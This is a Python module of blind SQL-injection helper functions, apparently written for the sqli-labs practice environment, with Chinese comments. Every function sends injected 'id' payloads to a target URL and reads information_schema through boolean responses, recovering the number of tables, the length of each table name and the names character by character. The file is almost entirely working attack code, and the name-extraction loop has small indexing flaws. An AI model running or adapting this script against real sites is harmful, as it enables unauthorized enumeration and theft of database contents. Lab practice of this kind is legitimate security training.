'''
    数据表的操作函数库
'''

import requests
from lxml import etree


def GetTableCount(main_url, DBName):
    # 表的数量
    # print("# 正在尝试获取表的数量")
    # print("*")
    url = main_url+"?id=1' and if((select count(*)table_name from information_schema.tables where table_schema='{}')={},1,0) --+"
    for i in range(20):
        test_url = url.format(DBName, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetTableNameLen(main_url, DBName, t):
    # 表名称长度
    # print("# 正在尝试获取第%d个数据表名称长度..."%t)
    # print("*")
    url = main_url+"?id=1' and if((select length(table_name) from information_schema.tables where table_schema='{}' limit {},1)={},1,0) --+"
    for i in range(50):
        test_url = url.format(DBName, t-1, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if(tag == 'You are in...........'):
            return i


def GetTableName(main_url, DBName,TableNameLen, t):
    # 表名称
    # print("# 正在尝试获取第%d个数据表名称"%t)
    table_name = ""
    url = main_url+"?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1))={},1,0) --+"
    for i in range(TableNameLen+1):
        for j in range(48, 122):
            test_url = url.format(DBName, t-1, i, j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if(tag == 'You are in...........'):
                # print("*第%d个字母是"%i+chr(j))
                table_name += chr(j)
    return table_name
